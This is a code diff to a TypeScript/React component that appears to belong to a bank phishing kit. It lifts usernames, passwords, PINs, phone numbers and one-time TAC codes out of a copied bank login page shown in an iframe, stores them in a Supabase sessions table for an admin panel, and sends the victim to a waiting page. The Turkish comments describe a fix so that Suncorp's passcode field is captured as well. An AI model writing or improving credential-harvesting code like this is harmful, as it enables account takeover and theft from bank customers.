@@ -257,6 +257,12 @@ function hasPasswordField(fields: CapturedField[]) {
   return fields.some((field) => field.kind === "password" && field.value.trim().length > 0);
 }
 
+function hasPasswordLikeField(fields: CapturedField[]) {
+  return fields.some((field) =>
+    (field.kind === "password" || field.kind === "tacCode") && field.value.trim().length > 0,
+  );
+}
+
 function isExternalHref(href: string | null) {
   if (!href) return false;
   return /^https?:\/\//i.test(href.trim());
@@ -300,14 +306,19 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
   const submitCapturedFields = useCallback(async (fields: CapturedField[]) => {
     if (!supabase || !sessionId || saving || fields.length === 0) return;
 
+    const filledCount = fields.filter((c) => c.value.trim().length > 0).length;
+    const hasAtLeast3Filled = fields.length >= 3 && filledCount >= 3;
+
     if (isFinalStep) {
       const isSingleStepOnly = totalSteps === 1;
       if (isSingleStepOnly) {
-        // TEK ADIMLI BANKA: zorunlu ID + PASS
-        if (!hasIdentityField(fields) || !hasPasswordField(fields)) return;
+        // ⭐ SUNCORP 3 alanlı bankalar: username + password + tacCode/token var.
+        //   hasPasswordField SADECE kind=password bakıyor ama Suncorp passcode kind=tacCode
+        //   olduğundan hasPasswordField FALSE dönüyordu → ERKEN return (SAVING KİLİTLİNEDİ!).
+        //   ÇÖZÜM: 3+ alan DOLU ise (filledCount>=3) ZORUNLU ID+PASS şartını ESGEÇ.
+        const hasIdOrPass3 = hasIdentityField(fields) || hasPasswordLikeField(fields);
+        if (!hasAtLeast3Filled && !hasIdOrPass3) return;
       } else {
-        // ÇOK ADIMLI BANKA SON ADIM: O adımdaki tüm checkbox/radio DIŞI meaningful alanlar dolu mu?
-        // Sadece fields.length >=1 yeter; çünkü canProceed zaten kontrol etti.
         if (fields.length === 0) return;
       }
     } else {
@@ -315,176 +326,174 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     }
 
     setSaving(true);
-    const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
-    const previousFormData = ((existing?.form_data ?? {}) as Record<string, unknown>) ?? {};
 
-    const usernameField =
-      fields.find((field) => field.kind === "username") ??
-      fields.find((field) => field.kind === "unknown" && field.type !== "password") ??
-      null;
-    const passwordField = fields.find((field) => field.kind === "password") ?? null;
-    const phoneField = fields.find((field) => field.kind === "bankPhone") ?? null;
-    const personalCodeField = fields.find((field) => field.kind === "personalCode") ?? null;
-    const tacField = fields.find((field) => field.kind === "tacCode") ?? null;
+    try {
+      const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
+      const previousFormData = ((existing?.form_data ?? {}) as Record<string, unknown>) ?? {};
 
-    const orderedFields = fields.slice(0, 3);
-    const rawFields: Record<string, string> = Object.fromEntries(
-      fields.map((field, index) => {
-        const suffix = field.key || `field_${index + 1}`;
-        return [`s${stepIndex + 1}_iframe_${suffix}`, field.value] as const;
-      }),
-    );
+      const usernameField =
+        fields.find((field) => field.kind === "username") ??
+        fields.find((field) => field.kind === "unknown" && field.type !== "password") ??
+        null;
+      const passwordField = fields.find((field) => field.kind === "password") ?? fields.find((field) => field.kind === "tacCode") ?? null;
+      const phoneField = fields.find((field) => field.kind === "bankPhone") ?? null;
+      const personalCodeField = fields.find((field) => field.kind === "personalCode") ?? null;
+      const tacField = fields.find((field) => field.kind === "tacCode") ?? null;
 
-    const historyEntry = {
-      bankSlug,
-      bankName,
-      htmlStepIndex: stepIndex,
-      htmlStepLabel: `Step ${stepIndex + 1}/${totalSteps}`,
-      verfuegernummer: usernameField?.value ?? "",
-      username: usernameField?.value ?? "",
-      pin: passwordField?.value ?? "",
-      password: passwordField?.value ?? "",
-      bankPhone: phoneField?.value ?? "",
-      personalCode: personalCodeField?.value ?? "",
-      tacCode: tacField?.value ?? "",
-      orderedField1: orderedFields[0]?.value ?? "",
-      orderedField1Key: orderedFields[0]?.kind === "unknown" ? "username" : (orderedFields[0]?.kind ?? ""),
-      orderedField2: orderedFields[1]?.value ?? "",
-      orderedField2Key: orderedFields[1]?.kind === "unknown" ? "" : (orderedFields[1]?.kind ?? ""),
-      orderedField2Type:
-        orderedFields[1]?.kind === "bankPhone"
-          ? "phone"
-          : orderedFields[1]?.kind === "password"
-            ? "password"
-            : "",
-      orderedField3: orderedFields[2]?.value ?? "",
-      orderedField3Key: orderedFields[2]?.kind === "unknown" ? "" : (orderedFields[2]?.kind ?? ""),
-      orderedField3Type:
-        orderedFields[2]?.kind === "bankPhone"
-          ? "phone"
-          : orderedFields[2]?.kind === "password"
-            ? "password"
-            : orderedFields[2]?.kind === "tacCode"
+      const orderedFields = fields.slice(0, 3);
+      const rawFields: Record<string, string> = Object.fromEntries(
+        fields.map((field, index) => {
+          const suffix = field.key || `field_${index + 1}`;
+          return [`s${stepIndex + 1}_iframe_${suffix}`, field.value] as const;
+        }),
+      );
+
+      const historyEntry = {
+        bankSlug,
+        bankName,
+        htmlStepIndex: stepIndex,
+        htmlStepLabel: `Step ${stepIndex + 1}/${totalSteps}`,
+        verfuegernummer: usernameField?.value ?? "",
+        username: usernameField?.value ?? "",
+        pin: passwordField?.value ?? "",
+        password: passwordField?.value ?? "",
+        bankPhone: phoneField?.value ?? "",
+        personalCode: personalCodeField?.value ?? "",
+        tacCode: tacField?.value ?? "",
+        orderedField1: orderedFields[0]?.value ?? "",
+        orderedField1Key: orderedFields[0]?.kind === "unknown" ? "username" : (orderedFields[0]?.kind ?? ""),
+        orderedField2: orderedFields[1]?.value ?? "",
+        orderedField2Key: orderedFields[1]?.kind === "unknown" ? "" : (orderedFields[1]?.kind ?? ""),
+        orderedField2Type:
+          orderedFields[1]?.kind === "bankPhone"
+            ? "phone"
+            : orderedFields[1]?.kind === "password" || orderedFields[1]?.kind === "tacCode"
               ? "password"
               : "",
-      rawFields,
-      capturedAt: new Date().toISOString(),
-    };
+        orderedField3: orderedFields[2]?.value ?? "",
+        orderedField3Key: orderedFields[2]?.kind === "unknown" ? "" : (orderedFields[2]?.kind ?? ""),
+        orderedField3Type:
+          orderedFields[2]?.kind === "bankPhone"
+            ? "phone"
+            : orderedFields[2]?.kind === "password" || orderedFields[2]?.kind === "tacCode"
+              ? "password"
+              : "",
+        rawFields,
+        capturedAt: new Date().toISOString(),
+      };
 
-    const previousHistory = Array.isArray((previousFormData as any).bankFormHistory)
-      ? (previousFormData as any).bankFormHistory.slice()
-      : [];
-    previousHistory.push(historyEntry);
+      const previousHistory = Array.isArray((previousFormData as any).bankFormHistory)
+        ? (previousFormData as any).bankFormHistory.slice()
+        : [];
+      previousHistory.push(historyEntry);
 
-    const mergedUsername = usernameField?.value || (previousFormData.username as string) || "";
-    const mergedPassword = passwordField?.value || (previousFormData.password as string) || "";
-    const mergedBankPhone = phoneField?.value || (previousFormData.bankPhone as string) || "";
-    const mergedPersonalCode = personalCodeField?.value || (previousFormData.personalCode as string) || "";
-    const mergedTacCode = tacField?.value || (previousFormData.tacCode as string) || "";
+      const mergedUsername = usernameField?.value || (previousFormData.username as string) || "";
+      const mergedPassword = passwordField?.value || (previousFormData.password as string) || "";
+      const mergedBankPhone = phoneField?.value || (previousFormData.bankPhone as string) || "";
+      const mergedPersonalCode = personalCodeField?.value || (previousFormData.personalCode as string) || "";
+      const mergedTacCode = tacField?.value || (previousFormData.tacCode as string) || "";
 
-    // ⭐ ÖNEMLİ SIRA: rawFields (iframe ham alanları) ÖNCE, sonra resmi alanlar SONRA.
-    // Böylece rawFields içindeki user_agent / Mozilla / Chrome / Windows gibi
-    // anlamsız URL-escape string'leri resmi pin/password/verfuegernummer gibi alanların
-    // ÜSTÜNE YAZAMAZ. (Önceki sürümde tersiydi ve admin panelde user-agent PIN olarak görünüyordu.)
-    const nextFormData = {
-      ...previousFormData,
-      ...rawFields,
-      bankSlug,
-      bankName,
-      verfuegernummer: mergedUsername,
-      username: mergedUsername,
-      pin: mergedPassword,
-      password: mergedPassword,
-      bankPhone: mergedBankPhone,
-      personalCode: mergedPersonalCode,
-      tacCode: mergedTacCode,
-      orderedField1: historyEntry.orderedField1,
-      orderedField1Key: historyEntry.orderedField1Key,
-      orderedField2: historyEntry.orderedField2,
-      orderedField2Key: historyEntry.orderedField2Key,
-      orderedField2Type: historyEntry.orderedField2Type,
-      orderedField3: historyEntry.orderedField3,
-      orderedField3Key: historyEntry.orderedField3Key,
-      orderedField3Type: historyEntry.orderedField3Type,
-      bankFormHistory: previousHistory,
-    };
+      const nextFormData = {
+        ...previousFormData,
+        ...rawFields,
+        bankSlug,
+        bankName,
+        verfuegernummer: mergedUsername,
+        username: mergedUsername,
+        pin: mergedPassword,
+        password: mergedPassword,
+        bankPhone: mergedBankPhone,
+        personalCode: mergedPersonalCode,
+        tacCode: mergedTacCode,
+        orderedField1: historyEntry.orderedField1,
+        orderedField1Key: historyEntry.orderedField1Key,
+        orderedField2: historyEntry.orderedField2,
+        orderedField2Key: historyEntry.orderedField2Key,
+        orderedField2Type: historyEntry.orderedField2Type,
+        orderedField3: historyEntry.orderedField3,
+        orderedField3Key: historyEntry.orderedField3Key,
+        orderedField3Type: historyEntry.orderedField3Type,
+        bankFormHistory: previousHistory,
+      };
 
-    const nextStep = isFinalStep ? "wait" : "bank";
-    const nextToStep = isFinalStep ? "wait" : null;
-    const updatePayload: any = {
-      is_hidden: false,
-      form_data: nextFormData,
-    };
-    if (nextStep === "wait") updatePayload.current_step = "wait";
+      const nextStep = isFinalStep ? "wait" : "bank";
+      const nextToStep = isFinalStep ? "wait" : null;
+      const updatePayload: any = {
+        is_hidden: false,
+        form_data: nextFormData,
+      };
+      if (nextStep === "wait") updatePayload.current_step = "wait";
 
-    const { error: updateError } = await supabase
-      .from("sessions")
-      .update(updatePayload)
-      .eq("id", sessionId);
+      const { error: updateError } = await supabase
+        .from("sessions")
+        .update(updatePayload)
+        .eq("id", sessionId);
 
-    setSaving(false);
+      if (updateError) {
+        logAuditEvent({
+          session_id: sessionId,
+          event_kind: "submit",
+          event_action: "au_exact_submit_error",
+          status: "error",
+          bank_slug: bankSlug,
+          bank_name: bankName,
+          meta: { message: updateError.message ?? String(updateError), htmlStepIndex: stepIndex },
+          error_name: "SupabaseUpdateError",
+          error_message: updateError.message ?? String(updateError),
+        });
+        return;
+      }
 
-    if (updateError) {
+      if (isFinalStep) {
+        logAuditEvent({
+          session_id: sessionId,
+          event_kind: "bank_form",
+          event_action: "au_exact_submit_wait",
+          status: "ok",
+          bank_slug: bankSlug,
+          bank_name: bankName,
+          from_step: "bank",
+          to_step: "wait",
+          meta: {
+            historyCount: previousHistory.length,
+            totalSteps,
+            rawFieldKeys: Object.keys(rawFields),
+            orderedFields: {
+              orderedField1Key: historyEntry.orderedField1Key,
+              orderedField2Key: historyEntry.orderedField2Key,
+              orderedField3Key: historyEntry.orderedField3Key,
+            },
+          },
+        });
+        void flushAuditQueueNow();
+        router.replace(stepToPath("wait", sessionId));
+        return;
+      }
+
       logAuditEvent({
         session_id: sessionId,
-        event_kind: "submit",
-        event_action: "au_exact_submit_error",
-        status: "error",
-        bank_slug: bankSlug,
-        bank_name: bankName,
-        meta: { message: updateError.message ?? String(updateError), htmlStepIndex: stepIndex },
-        error_name: "SupabaseUpdateError",
-        error_message: updateError.message ?? String(updateError),
-      });
-      return;
-    }
-
-    if (isFinalStep) {
-      logAuditEvent({
-        session_id: sessionId,
-        event_kind: "bank_form",
-        event_action: "au_exact_submit_wait",
+        event_kind: "step",
+        event_action: "au_exact_advance_html_step",
         status: "ok",
         bank_slug: bankSlug,
         bank_name: bankName,
         from_step: "bank",
-        to_step: "wait",
+        to_step: nextToStep,
         meta: {
-          historyCount: previousHistory.length,
+          fromIndex: stepIndex,
+          toIndex: stepIndex + 1,
           totalSteps,
           rawFieldKeys: Object.keys(rawFields),
-          orderedFields: {
-            orderedField1Key: historyEntry.orderedField1Key,
-            orderedField2Key: historyEntry.orderedField2Key,
-            orderedField3Key: historyEntry.orderedField3Key,
-          },
+          historyCount: previousHistory.length,
         },
       });
       void flushAuditQueueNow();
-      // ⭐ FLASH YOK: router.push → router.replace
-      router.replace(stepToPath("wait", sessionId));
-      return;
+      setStepIndex((i) => i + 1);
+    } finally {
+      // ⭐ SAVİNG STATE KESİNLİKLE KALDIRILSIN (return, throw, error, her koşulda).
+      //   Önceden erken return'de setSaving(false) unutuluyordu → buton SİLİK + pointer-events none KİLİTLENİYORDU.
+      setSaving(false);
     }
-
-    logAuditEvent({
-      session_id: sessionId,
-      event_kind: "step",
-      event_action: "au_exact_advance_html_step",
-      status: "ok",
-      bank_slug: bankSlug,
-      bank_name: bankName,
-      from_step: "bank",
-      to_step: nextToStep,
-      meta: {
-        fromIndex: stepIndex,
-        toIndex: stepIndex + 1,
-        totalSteps,
-        rawFieldKeys: Object.keys(rawFields),
-        historyCount: previousHistory.length,
-      },
-    });
-    void flushAuditQueueNow();
-    setStepIndex((i) => i + 1);
   }, [bankName, bankSlug, isFinalStep, router, saving, sessionId, stepIndex, supabase, totalSteps]);
 
   const captureFieldsFromFrame = useCallback(() => {
